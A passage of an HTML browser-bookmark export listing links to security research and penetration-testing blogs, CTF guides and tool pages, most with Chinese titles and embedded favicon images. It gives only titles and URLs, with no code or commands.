rel="noopener">MetaTwin - 借用Microsoft MetaData和签名来隐藏二进制有效载荷</a><br>            <dt><a href="https://pentest.blog/category/tools/" add_date="1507780417" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADZ0lEQVQ4jW1QT0wjdRj9fvNvf9NOxy3dFoF06zbbqJWk27CJCXuQQ+HgguImA4d1r3AgURO8msxZE/ekSU+EAxolYeVEIECq2KQRYnC3i5s2XVoDLZ0WynRmOjPtdMaLdYnxnd6XvO+973ukKIpEKpVypqen3/D5fN9Fo1HPwsLC883NTQsAEPwDURQZt9stBAKBr6KxWLaQy1UFQSARABAAYCcSibBpmg/dbrcHY8xEIpFvZmdniwAAq6urA6enpx83Gg2/qqoXtm2v7+3tPRUEgSR7CeFw2IMQ8mxvb389ODjISpL0QblcfokQgnQ6/Wkun/8sEolMybJsUxTVOj4+rs7MzCCqZ2BZVgsAvAAAu7u7TyYnJ387ODj49lk2e/4az+83Gg2+VCoNEwTh7XQ6f/X2CHgF4wpHGOM4x3FLLpbdf5HLfW4YBmiaNoAoyulpRVEECgAcAACWZTuqqnaTySSdyWRG2+32y62traNQKJSRm82wz+eDoaGh0/Pz81tut7sX5vx7wcbGhknT9PVsNhtdWlr6eWVl5SgWi/0oK8q7NE2Dh+MeT0xMFCiKelPX9cZ/DRAAgNfr/Smfz78HADA6OvpJ4/JS8HAc9Hm9LxKJxBdP1tcnMcYbqVTK6r1PAgASRREpikLt7OxI4XD4eHx8/L4syw81Xd8KhkKP/T6f7TgOy9D0r2tra89HRkbo+fl5x+/3X+3wFZLJpEsUxeHevLi4ODI3N0f/nxYJguDnef5es9nUCILw8DxvVatVr2maXDAYrCCELIxxS9d1u9Pp9Nu2bbpcrpZlWbRlWSwZiUTu6Lr+lqqqHpIkmaaqhlqa1l+v1+8DQMNxnEqlUolrmhZACGFN0xhJkqZomj5SFOUdgqZpqFarJ+12m2EY5vCsXB4mCCLz4aNHH0mSxBWLxXuGYXRq9Xrk98PDWUVRTmq1GkiSNFir1b4nh27efJ/F2KIo6tbZ2VnbNM1AX18fd1IovK3rutu2bd+FLP8Ctv26YRgtgiAKDMN4OI6rjo2NpciB/v7bLpfrqaZpf8qq6iFpukwg9Ee32/UWS6UvrW53IBQMBi8uL++yGF/DGN+xHWcKAWSXl5f3qHQ6/cOVUp9d4Zl4PP6AJMm71zDmCYLg7W6XtSxL43g+H7hxYx8A4G8EoZPyuVZmtAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">工具 - Pentest博客</a><br>            <dt><a href="http://www.fuzzysecurity.com/index.html" add_date="1507869150" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADcElEQVQ4jXWTW0xbdQDGv9P/udHb6QUKXQu0DLpabGHAGLEOlxjdHPCgMfPdhMQnfVgW9cG9GOMlxheN4cFr1C3RZVlECToJujHCtmxgWTs2LqWUW6GW03t7yjnHF/sg0e/5+31Pv4/CfyQYDBp6etp9jXZbr16rPZLO5LWrsbWVhaXotcnJqTsAlGqXOsByF9549UxfX9dZh8PRX2erten1BiLL+9jZTiiRBwvL16fufHbx+9FPE4lEHgDoKun3+81vnn/lnLu5cdjT1lKnNxgohtcBhIEiFcDShFgsgofhuAsMQ7MffDTyPoB98g9P3n37/LmjAd/rbleTwPMcRWgCihBAkSGXi5CkMlQVsJoFtlwuedJ72dvRWHyNAMBLz59p6zve/Y7Fam7YSiTDKTGzC0WxsoxGA3kfuVxeXd/Y2dxNiTtiOmMwGvTGTDa7Oj1zd4oAwNDgKf9jXs/w7zdmFj4Z+erluzOhb+psFtpiFroJ0VD37oVmro7++tqlb6+MhB89ZAhhehiuphRf3/6RBgANASdVJDIXioiRyOJiKnUrY2uwful2NQ1QFOVYXo2Pv/fhxxMA1BPB4JK7eU9psFkP2e1GnQYAivnCX7Ks5CwmwdXa2twOAKmsuFPI57O5XA7bWwkJAJxOZ2urp+mk02GnCU1Xamp4mQCAzsCUA/5Av63WelRWIGh5XiYazekOf/ug1WpiV9c2SSFfqg8Gjw13PO4bdDU7qfjGxo2b06ErNABMTNxODTw3MH68u/MpXqt90e1qfMZkErTuwy6W41l0dwVOSvvKE+5mJ+v1tFCx2Hp2ZSX+cygUylc9UH8a++Wyt83V39sdGOrqbDepqorQfAQVqQxFBfXs00Gu1mqBKKbV0P0H46Njv40DQNUDRKPxtCLLW4JJOGavr7Wl0xnMzs6DYxkUi0UcstdDVRXMhcLrn39x8a1HSyvhf5kIAJd+GJ1yu9x/tB52+TiO05x4shdGgwH5QgEcx4Hna0BoZlcGPV9lNAe+oEqVkmg2m8HxvEpRlGoUjNDrdIitbSgsy6rJZFLKJ5NcFaAPDJCHi6ubs3P3FxeXo4JULnFnXxgSZv8Ml77+7nK0w+9buH7z1tXlzc2d/3sjAOj8Xm9LrlxwCQbjkY5OX724J0bHxienK5VKDIAIQK2W/wbiNWqF0HJ43wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">模糊安全| 家</a><br>            <dt><a href="https://blog.quarkslab.com/index.html" add_date="1508461234" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACb0lEQVQ4jaVSS0iUURT+zv3v/880YYk5Qw5pEhWtspKcaSiSyMmFFARKLTKyxZS2aRERtJggWtpCrdwUREI1GPawUoSMDOkBRotaZA+MNNPKcUicce45LcywSYTo2xzOOff7zuMe4D9Bs53KyuvW0MToIi3ictJZic7O6h+z89FoVP2yPBPT00YoGG4qGYgPH2RGMAksnMDYYElZw22x1eVnd+s+A8D9Pv82RfIewNs/OgiEG/cwcz0E2UT0UgjfILJSBCsU6KGlVaS3o66/uOLCGcut+1z+xSlvnhrMzRl9YYXKGzcZw80ETCqtIp5sdSqZZ19xjXFMFCVZZC8J/AXFZe1myt5JLrscbnvc67fKliz15Os0yyER+LSi6t6OIzdnjTxYWnrp9IROFLDIbivubLRclIQxDb3nqtpCra3LPZ50kxLGFiK8cbmdB5kb7u4+MAlFNwRwM3gdlBolURoAUlNKs5BoQDwADSORnpzrmyyhhEBYmDzkWG1Gq+PBw9eKvn7hZbZWt5QC9QNSmHJU4VwChniDABYUfXgSq3lFbtdJInqcTOqzH5kvUiDcVGuMqVeKrjqOdbSnvfb7DDkYbgwY5hYBpdxwynu6IgOZBXQW65ZxMluZZV8yZfzBHU0xEh4xjCLDvB9Ajm2htqfjbzIA6K6uSHzz9uZjU5TShmVXmk0ZAAPAmr4Uei1a9c1FxsyjgXd34qvWhjt5yhoSojwAub8FAK8wrc9fXfH8U3/7cKYAZQZC4fM+BgcEHBLGGiHyQSTLUuqpbS048ehezci8ArNRWhrV8Hrd6QmyXQ6rHO1LxGJVqfk4/4yfUmIHUhu8HUcAAAAASUVORK5CYII=" target="_blank" rel="noopener">Quarkslab的博客</a><br>            <dt><a href="http://payloads.online/archivers/2017-10-12/1" add_date="1508494370" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAwElEQVQ4je2QsQ7BUBhGT6US6SIdDBWLyQv01kNQ7SDps5iYaOJh0HTUGDt5Bg9gMiiLXoNU3KgBI2f+7vm++8Ofr9FsISTAoT8DwDENALJ1yCKKtCJY5ABaTesu0N9pK0o6psExCQGofLj8eUE9HgGQWRa1RlsJ2Y4zOfSmpQJlQVW/+c77nZqSclwUOKbBaTMvF6Rpqg2DoPtqbj0ecUxC8vwCwHIVacp1H/Fdd6t8QwhpCyF9byB9b1D65le5AlDEM1L+XA7PAAAAAElFTkSuQmCC" target="_blank" rel="noopener">PHP代码审计技巧总结 | 倾旋的博客</a><br>            <dt><a href="http://blog.orange.tw/" add_date="1508336040" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACBElEQVQ4jXWSzWsTYRDGf/PuxiRuEqlCsFFJerbRk2BvehFP9qAn8Sh4FfwA0X/AgxXvVjwUBXvqRfBiPYlaFBEvnhoxgjbUhHztNtnd8bC7SRrtwPB+zTzzzPMORKZTPgDWgd9ACzjJHiYJwKGVwvg2gO1PO1x+XUQz8HzjxzJw9X8AJl4/Dz76iC0QRrCp0ykyiyn8gQBcAp4B2WkAK14/DN4Nr+0ctegVDa4NoSjHmg53LOHevJcp563qq3pwN27p/XQLAPcPwu2vFx1m8wIasjEsElhwKr2FZQy/XOXEap+Gp9eBR5MAeaD984pDMSv4YdJftFExqIJtoOEqpZXeKDfR4PHSQpqSM04GCDGoGDotn8BX/BBmHeHhQppYkxHAmcWKzTDYLZBI5H/qHm4vwBgYBnChYgOcBbDj2GI5t7u6CHRaPlnHolLNA0q7GZ3LOQE4PMngXxPYjitHsxWdvV6ATEifADS+dxUz8aAhzFVzFGZs2k2f4UCZq+YpzNjUOgrRlI4A1tdqPimLXRaGUe1EA1UlZWCt5gO8iYkC4ADd6W8c0TSgCpbAlqscib4xC3gJgx5wa361T8NVMnYULHEFUUhbUfLxF32Am4AH41EGeOsFdB98GZ4r7BNK+w0H0oII1LvKk28+51+6eAE3gKU9xY+pPQU2AT/2zfguMx38F+BfzHPat3EEAAAAAElFTkSuQmCC" target="_blank" rel="noopener">橙子</a><br>            <dt><a href="https://www.cybrary.it/video/metasploit-part-5/" add_date="1508720536" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAt0lEQVQ4jc3SMWpCQRSF4U+fyAMR4w4EG7MJW3cQyBrsJJUbkfS6CVcQsgC7YGljo22Mz+aOPFSIWKgHLhyYO/85DMOzqBLzmOQGWtiiWmryhyJ8ceL3yJHV0MYEfWywC1Aei+WwMmiFcUpr4hPvWGOEJV7iPAtAaljHN34SOekjEhboXfkER1MNP4gWBd7QwQzzaForNTpTgnTxFZDfmGFc/FdpKcc0QK/XXLzU5BL4Jj3ml95HB2t1H91gkAvdAAAAAElFTkSuQmCC" target="_blank" rel="noopener">Metasploit（第5部分）msfcli - Cybrary</a><br>            <dt><a href="https://3gstudent.github.io/3gstudent.github.io/" add_date="1508722106" target="_blank" rel="noopener">3gstudent – Good in study, attitude and health</a><br>            <dt><a href="http://www.cnblogs.com/WangAoBo/tag/Writeup/" add_date="1509105326" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACpUlEQVQ4jU2RS08TYRSGz/nmm+l1sDVeWkmJZGIg2KmGeIliGkJkQyBhiRs10Y3G38Iv0BiN0RVbCY1KsZowCpQ2MdQpYKyVRQm1rYPTdma+46LB+Kze3XvDbO5NNptNp9PpG2lA9vLVi0KhcP/e/aFz54UQyJAEISIcwUzTnJmZKZVK5e1y6/cvIpqdnTXLZUQkAiBCRESkI1g8Fm+321NTU/nNfKPRDAaDqqo6jkNEQEQAACCEQMRutyuE4BdTl5YyrzVNsyzLNE1F8dVqtYFEAhGFEFzivSSZTGZpaUlVVRaPx6vVn6ZphkIhwzBCoeDe3t7a+lptv6b4FNd1iQgRS6WSYRi5XE6KRCLJ1MjVK5eTuj42NtYf79c0jTxYXFwkgMGzg67rAoDf749GoyMjI1gsFnVdd12HABCg15Vz3mwdPH32NKVfmBi/CYALCwvlcplzznRdJwLOZS7JAIjIOOcE7rG+4w8fPNrYWC99NYmo1WpVKpV6vc53d3clSRJCRCIRVVVt297f3ydwHa8bP31mcnLyk2EMDw2lUqlAIBAMBqXR0dFqtWqaZjgcjsVijUZjZWWlUvmxs/MtHFYHBgYLhUIymUwkEpqmHR4ewr9HPM9zHKfb7dJ/NBqNx4+fNJtNIUS9Xl9eXuadTocxhoiMMcYYAPRmISLGJNu2Pc/1+wOO4yiKMjw8zCVJIiLGWG/vf9r1OrIc+ryxGjtzQlFkACAQp06dYJb1W5ZlIbyeDyJDRJTI7wsVv6xvbW1NjE8aax/fvsv4FL/nCelkLBoOB9Q+tdNuCxIkxGHbstt/Nosbq8bq3NytsNr3/Pkzc/urZVlcUvj09PT8/Lxt29evjZEAQFJ8cj6fr/yo3Ll9lwQcHNRkRf5eqX14/+GYGv0LhBN+F3s4tlQAAAAASUVORK5CYII=" target="_blank" rel="noopener">Writeup - 标签 - M4x - 博客园</a><br>            <dt><a href="https://blog.zsec.uk/" add_date="1509324475" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAChUlEQVQ4jWXSSUjUcRQH8Pf7/bf5z+KMTZhmJraBYYY52WIZqa2GQRk6GFZ2ENosOkRSUDepQNA6FAkRiJ3sEEIFYgmVVodEsJKcMBfMJbcZZ+Y//997HcaNesf3vu/xDh+2ubAO/i8iAmCMERFjbOlEXmgR0WKbMQYQHRERAfD5DAcgwzBD4QjA4sbSm0TEAMJzGeBT/vD+XetuX8oLzEY4AyIQiEKgEIhIQqAs8cnpYEXJ1gul2yemg/I577bTx7b0DU1ommwKlDhXJSn6EyIRkInIJZ4U7zyYsyEhzsFyyx4LpLVJseVFnmt3X966mJexMSEYNBFIUyQjIsqrmiqKs776Rl+2fXe7rCz1UI0QyCW+frW79kaBK0afmTVcDotFlX+P+226gkg3a1vetPuQkIBxVZasugoEYxMBV4xeXtWUf6q+ufVbb/94yZVne8vqAyEjHDaD4YhN13RN5sCAcwZEIcPUNdnttFZfPZCdmWwY4umdojVJy3RNiQgUghhnDJjkTM6fmglZrUqOJ8XpsHiPpGemJbZ86H31tufE4fTC3NSfA5MDw9Oj44GRPwHTRFZyudEda9Utym5P8vV7r58/KI2YqKrSyriYz12De7JSsr0PvQXpERM/dQ3YdEXaV3jm/MkdnrRVxZWNmqokxjvuN7R3dPb3DU5UP2pzx+pfuocbXnSePZ5ZWbZzeMwv/Qpt6u4diRii+8eoLPOW9z5/0BgamfnYNWjR5ObWHkRUZWnFcntrh6/myTuWcbQuZJjBkBlj14hI4pyAopoQSeJMIDGAQNBgjNltqiyQVEW2aIoQyBjDpQQBkAAACMBu0wBACJKjVIX4l/EC1XnLc4j/AhgHRJzVOOeSAAAAAElFTkSuQmCC" target="_blank" rel="noopener">信息安全探险</a><br>            <dt><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" add_date="1509199795" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">简介 · CTF All In One</a><br>            <dt><a href="http://www.vxjump.net/files/a_page/2/security1.htm" add_date="1509332298" target="_blank" rel="noopener">From Vx,Jump Security…</a><br>            <dt><a href="https://ub3r.cn/?p=30" add_date="1509854970" target="_blank" rel="noopener">如何优雅的维持住一个Web shell – ub3r</a><br>            <dt><a href="https://0x00sec.org/" add_date="1509765327" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACNUlEQVQ4jY2SMWgTURjHv/fu5TXvTmKsFKHorlOrCGK6lgqCBUXoUAjEIZdcYshgFqduXXS5ene9W2IXFYuDpULpWMGAIHbUxc3BTuGIuby77xIHexLilfabHv/v//u+P4+P2Lbd4pw/DcOwaRjGFpyhNjc3H2QyGQ8RNygimgCwp2naS8/zCqfBjuNc55xvD4fDjhDiGQEAWFtb47Ozs7uKosxJKW8bhvEjDTZN87Kqqp8Q8aeqqovFYvE3SZqu654nhBxSSuNer7fQbDZ/jcPr6+sXpqenDyilF7vd7nyr1ToCACDjJtd1rzLGOqPR6LuUcrFWq/WON08JIXYVRVmQUi5Uq9WvCUPHB+i6/i0IgrsAcJMx9iLRhRDPOeeLiLg8Dv+XICnLsu7lcrmdfr+vE0J8VVVf+76/ahjGq0lv6gAAAMdx7hNCgjiO5Wg0mqnX62/TfDRNBAAghBAAgGw2++995gG2bS9rmvaOUnoljuNL+Xz+jeM4q6mLJgXLsgpCiI9RFG3puv4IAMDzvA3Oed33/TuNRmP/xASWZV3LZrMfwjD87Pv+40QfDAZPwjDc1zTtveu6N1ITtNvtfBiGh5RSRMRCtVo9Gje22+08Ih4AwAwiziV9CvD3UBBxmzEmoihamoQBAEqlUvf4RiJFUXYsyzoHAEBM05xSVXWLMbYyGAwKlUqlk/ZZSXmeN88Y+4KIe1EUrVAhRINSuhQEQfE0GACgXC4fSikfMsZuKYrS+gM9auz8qmLRcQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">0x00sec - The Home of the Hacker</a><br>            <dt><a href="https://pentestlab.blog/" add_date="1510194962" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Penetration Testing Lab | Articles from the Pentesting Field</a><br>            <dt><a href="https://blog.ripstech.com/" add_date="1510272189" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC5UlEQVQ4jYVTTYgcVRD+6r3X3dPvzUz3W3e2u5coLCYEEkEX8SIEchCCP1lEchEJKAoqJIogBAQJaMSbqOgeFE9GPESjElQSCDkIQiJ4MCiigopkd91dd3Yzmdnp6X6vPGyEnb1Yp6K+rz6qqK+A8SAAAgAQT+zSaX7ZTExfRLPZuYmLHfyxggDAAHyc5EdMHF0hopKZjQlb30Xt/H4A/n+EEmts8aGxBRubnwAgAURNW5wydpq1LeYBmO099J9C1J46pJR6D+A+jfjIKAQFXrwN8mXt/XEJnwgRnWFi57h6cthd+WZLpZlNmbR4Q0n5GZg/6q8tzjpF9ynGB97hZO39m5Lkx57kXTe6ozuZ/XkF9ZVOilNIEkuBnrw7jIJzAGrHfFSCjjJYDtaHLxgb3lZVrhqxXDOheIsZyx44K4nOAOhV9eiBmyukqbbxVSnVLu/cl/3uwsNxWswxOQ0WUhBWB92lCyYtLgqlDnhX/9zvLs4CGFKUTN2uhHyFgT+88z9KKecB3/cez29uLH0CACbNHwfR62BIDzwj4A8wKBmU1ctKEbfAtI8JPxDzn3B8DBKPCSneNWneZIIBiVfZ8yVP/lNyWGBBPYDujRRtXSRsTuw3afG9scVPUWtyLwDESf6iscXI2KKvbf4sAARpZ7Zp89+0zb9tNJIZAEAjnTyo0/wkAOhW9pBOiytxmj23JZzdEbU7uwFA2+wlnRaXG2l+EIDSSfZa0L7lHtJ6cppCdah2vFr2/j6HZt4xAd4hiPBG3XsqDoKYOHofzMuD9foYsNqL06lHGDDDms6PGUlIsYfK+uxgsLqgbfE0wE8A8B40P+wunm40shlq4DCDrg7Xly6NOREAGkk2Q4Ie9N7/Um4sX4jand2icuXm5tpfkc0OS0e3DqrqC2z+c237923PGQDpVjYHIfLBhj+NZBhqET/qnPu9vL7y9Q7u+ATbgXAi3x8wz3lPtWf3eXl95dedHAD4F9/zHcJEiT+SAAAAAElFTkSuQmCC" target="_blank" rel="noopener">RIPS技术博客</a><br>            <dt><a href="http://k4linux.com/" add_date="1510358998" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADGUlEQVQ4jW1TTWxUZRQ997038zozTDutDsWxNiKlkRgCMf7VSqLGKOLfGk1csDExaExYkIAkLIyu3GiUAFGC7MbfRBfaNILVREr4SdFiRal1pFI6nXamw8x77/ve9x0XOB013tXNveecexfnAP+o/fvptHr+vPdmzn18H+c+updTOwsrc7YxACBobwQiZO3ktrlo3fNfn1HDpYrbIwD780750Xs6xm6QiWOS2zJKUkSEKwJ/DySsl948Mpp65eioC5ch1qwGHHFQrriInQy2PxjbFx9vviH+mldXREgKANQXZ97e+16Dm3fM6K/GF1SkG4YMSIZUcdOcOFdTwy+V433HLKkXX2sdvv594/wzBz+vcXjnTNQMrxlSM4iUbUbKNkNlg0hZUtGYwGx/vaI//DYiaxNbr5OLcKdL8yOP7V6wv/xR1cbGNtLKaqNtI4zYCENqo22otDVW2aXlpvrgOG0Ux0UA8HD3kfVjk7hrbW+Egb4uDzBYqEZM+47ksj4AQbUeiqWww/eQyzrehkKI0ryzheXvCh46B25dDpKpL88q+WysbE9MKLmjH5iaFa4ruJLvdPHrrGZ/r4unHuiBpYusH4iO/Bzy69d68FyQglya6O12ZeCWDNIZ4IUnk/jtSgQ/ASRdIpd18MPFJfgeuNQQua0vBUAcD82pUueq28MnhlL+0MYuGdpILDdiZjOeDPanAQBax2IsqGIimYBMXgrpODZA48plB1M7Lj6y2R+/MJtGpa61MrDJpIdIk83IIFAWFi4hDjLpJIyxxkga+W7nDLo2zTjyEOK+9PT7W+9MyMtvNZl0reMnBKTAEaEjIAAkPBdCzfEfr9nCal9WdYTviKBtJMbVA/uOkk/vmVcXfq/rlomsjWwch2a+UtUjJ+fUpaukUsHhfxuJlGKx6FItHnr3i4gP765z14EFjpxasqcml+zxs4v85nzEyxXSmPDQ6dMHEy1yO0ytTNXOPXvVDD43/pO6v6ezI5XvcuEnGdzU7X7vo3pY/Bs//f80tkNFAOCfn2xA96YCkDaI6iXJDU7/FwMAfwEC9NqS1xrp/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">k4linux - Linux教程 - Kali Linux - 渗透测试教程</a><br>            <dt><a href="https://haiderm.com/fully-undetectable-backdooring-pe-files/" add_date="1511312708" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC7UlEQVQ4jU2Oa0hTYRiA3/c7ZzmPzTNzUztzLZcppWvdlkmYZRdb9wsFlRQUUdHNCkJCKfoddIESIQqK/mZJF5DS6EJpVKiVuxRG5RTPzqJt7XbO+b5+SNTz8/nx8KCmaYQQRFRVNZFIiKIYCAT6+vqHvn6NRJRYLF5aWnq88Rj8hec4DgB6e9+camoqKipSVfXZ8+epdCajakiIpuluV2Ug+HmCgbdY8h2OqXj/wYMLFy/19Q/EEsmJJlMqmcrNFScYjTzPISIh5PfvZESRNTVDKZ1cWIjmfGsyreZbrYKQgwQBkFIK/2AASAhhjGVlZVXNm40FNofJnMcYU9WMplOOEEIIAFBKKWWEIzzHEUQAoIwBo7xRyBlPOuz2wgKLaDIZjUYESKczv2IxOayMjsmJZJLneabT+XPdPNU1yliJY8rehu2STRJFMUcQeAMPDFKplBwOD4dCnU+edj17kZ1t9AeDfFFhwY/RMdfMGdXVC8vKy+H/fcYQEQC2bN60befugUFfXU0NP33atLGwUldbkyuKrW1t3799X7y4ZlV9vaqqBoMhFovevHVbUSK1i6rXeVeazSLX0txszs2ZO8d98NCRnp6eeDx+7fqNMVmuX7FCluXVa9a/ffc+8jPyqPOxNFk6eGA/bti0Rdf1kdGRSXl5x48dtdvtQ0NDTS1nqzzzA36/kJ198kRjcXFx8POXlrPnLl84zzum2BljH/2B1V6v2+22WK2VlZWPOh+/fPU6k04vX77M5XJZrQUVFRUd9x+23+3gN25YP8vl0ih88gUkSQKAeDze09u7d3fDR5/fFwiOy2g0OvChf63Xi8PDw5IkDQ76tu5oqK5aMKO87F5HByCeaT5tzpu0a8++RQurysum32m/KwhC49HDyBjTdZ3juO7u7iutbdHoL6ezZGltrcezwOksedLVdbW1LRqLljqddUuXeDwepJQyxgAAEUdGQkpYoYxZLBabzUYpRcRQKKQoYcZgXP4B0B1aEWVLKYoAAAAASUVORK5CYII=" target="_blank" rel="noopener">完全无法察觉的后门PE文件</a><br>            <dt><a href="https://blog.xpnsec.com/" add_date="1511829790" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABUElEQVQ4jWNkYGAQUtMznsInKBjAwMDAyUAc+P7p/fsNty6dzWFUMzZexscjGEmkRhTw6cv75Ywm9i7fSLAZwyVMFGhmYGBg4GRBFxETFWGwNDWB8+/ef8Bw+959BndnR4Yjx08wvHv/AUU9s5SCUgOygJmJEUNzTSWDnbUVg521FcP///8Zbt+9xzCtt4vh5JmzDE+fPUcxgNHE3uU/igAjIwM7Oxuc//v3H4a/f/8ycLCzM/z4+RPDDxhe0NbUYEiNj8Hq4ckz5zDcuXcfRYwJq0oSAF4v/Pz5i4GBgQHO//ED0wsYLnCwtWY4vGMLw+EdWxjsrC0ZvNxc4HxzEyPCLkCOxmOnTjOwsLAwmBkZMjAwMDAcxhKNGAaQCpgYGBi+U6D/O9OnL+83kKv705f3G5jfPn++n4dfUI6dk1OFgYGBlVibP71/v+bWhbM5ABaBco2odvx5AAAAAElFTkSuQmCC" target="_blank" rel="noopener">XPN资讯安全博客</a><br>            <dt><a href="http://rinige.com/index.php/archives.html" add_date="1511163021" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABNklEQVQ4jaWSy04CQRBFzww9jIoYFXzFFVH//2PcujHGmPgAER9AkHHBKekYVzoJmeri1plb1QX/fAqgC+wDS8+NvwIogZRpG+O5+VECBsAp8AC0fwhbviugBhYWB/guAZ/AE3AjoFRY66r5AQhwAsrkF9vAifEC2MpaQkhpYbirgUkAprawq2BoQaMwn8s0ayVFC0PgRatlBhkDB8AhcA3MhLSEHCUPm8C2t9HJeu8J3AH6zqljcRsowkGVzeLSHmfAmeKRcwn90vgbEJOeW7xnfGW+r5ua9Q4ALKOFBvgQNtDNPXBuC7esdqXRUQx1dZdaf5be8T00/+65Ao6NNwTNWtqbWLAA3oBXRY8CGvM9oV3dTgvgQvrYdmKBYiMrxbBerIjruNPEesPiz/z8W67IwH9/vgCAJ2GIl6kybAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Archives - re4lity - 不负勇往</a><br>            <dt><a href="http://www.hackingmonks.net/p/home.html" add_date="1512993560" 